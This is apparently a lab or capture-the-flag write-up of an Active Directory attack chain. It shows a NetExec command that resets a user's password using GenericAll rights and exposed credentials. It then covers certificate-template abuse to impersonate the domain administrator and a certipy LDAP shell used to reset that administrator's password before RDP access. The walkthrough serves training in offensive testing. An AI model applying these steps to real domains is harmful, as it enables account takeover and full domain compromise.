I notice the user alt.svc has GenericAll over the yorinobu user account:

Now we can change the password of this user, add Shadow Credentials, or perform Targeted Kerberoasting. I will perform the first attack.

Using NetExec and the account alt.svc, I changed the password of the user yorinobu to Pwned123:

┌──(kali㉿kali)-[~/Desktop/Labs/Arasaka]
└─$ nxc smb hacksmarter.local -u alt.svc -p babygirl1 -M change-password -o USER=yorinobu NEWPASS=Pwned123

This new user belongs to the Remote Desktop Users and Remote Management Users groups. This means we can use RDP and WinRM on the DC if the ports are open:

I notice this user also has GenericWrite over the soulkiller.svc account:

Time to exploit this. Firstly, I requested the AI_Takeover template and added the alternative username which is the domain administrator specified using its SID:

The cool thing with certipy-ad is we can use the ldap-shell feature. Using this feature and the administrator.pfx file, I changed the password of the domain administrator to Pwned123 using the command change_password:

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.

 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 clear_shadow_creds target - Clear shadow credentials on the target (sAMAccountName).

 enable_account user - Enable the user's account.
 dump - Dumps the domain.

set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.

Using xfreerdp3, I gained access to the machine and recovered the root.txt flag:
